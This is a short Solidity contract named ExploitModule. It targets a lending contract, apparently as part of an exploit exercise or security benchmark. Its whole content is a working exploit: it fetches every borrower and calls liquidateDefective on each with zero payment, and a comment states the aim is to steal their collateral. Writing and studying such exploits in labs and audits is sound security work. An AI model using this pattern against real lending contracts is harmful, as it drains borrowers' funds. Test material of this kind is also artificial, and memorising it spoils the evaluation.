// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {LendingLiquidation} from "../src/LendingLiquidation.sol";

contract ExploitModule {
    LendingLiquidation public targetContract;

    constructor(address _target) payable {
        targetContract = LendingLiquidation(payable(_target));
    }

    function runExploit() external payable {
        // Get the list of borrowers
        address[] memory borrowers = targetContract.getBorrowers();

        // Iterate through each borrower and liquidate them
        for (uint i = 0; i < borrowers.length; i++) {
            address borrower = borrowers[i];

            // Liquidate the borrower to steal their collateral
            targetContract.liquidateDefective{value: 0}(borrower);
        }
    }

    receive() external payable {}
}